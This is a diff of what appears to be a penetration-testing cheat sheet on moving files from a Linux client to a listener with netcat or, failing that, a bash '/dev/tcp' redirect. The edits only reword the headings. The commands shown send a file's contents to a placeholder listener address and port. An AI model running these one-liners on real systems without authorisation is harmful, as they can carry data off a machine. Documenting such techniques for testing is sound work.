@@ -23,19 +23,21 @@ $FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPo
 
 ### Linux To Linux
 
+#### Send file from remote client to host machine:
+
 ###### Setup NetCat listener on Linux host:
 
 ```
 nc -nlvp port > file.ext
 ```
 
-###### On the Linux host connect back with NetCat:
+###### On the Linux client connect back with NetCat:
 
 ```
 nc -q 0 %ListenerAddress% %ListeningPort% < file.ext 
 ```
 
-###### If NetCat is unavailable, this can be done with bash:
+###### If NetCat is unavailable, on the Linux client connect back with bash:
 
 ```
 cat file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
